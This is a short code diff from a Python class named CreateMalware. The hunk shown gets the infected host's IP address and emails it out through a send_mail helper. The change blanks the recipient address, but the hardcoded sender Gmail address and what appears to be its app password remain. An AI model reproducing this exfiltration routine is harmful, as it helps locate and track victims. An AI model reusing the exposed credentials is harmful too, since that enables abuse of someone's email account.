@@ -30,7 +30,7 @@ class CreateMalware:
                     print("An error occurred while sending the email:", e)
 
             ip_address = socket.gethostbyname(socket.gethostname())
-            recipient_email = "nedlauceby@gmail.com"
+            recipient_email = "."
             sender_email = "uu0915222@gmail.com"
             password_mail = "ympjrgfxvclzaqdw"
             send_mail(sender_email, ip_address, recipient_email)
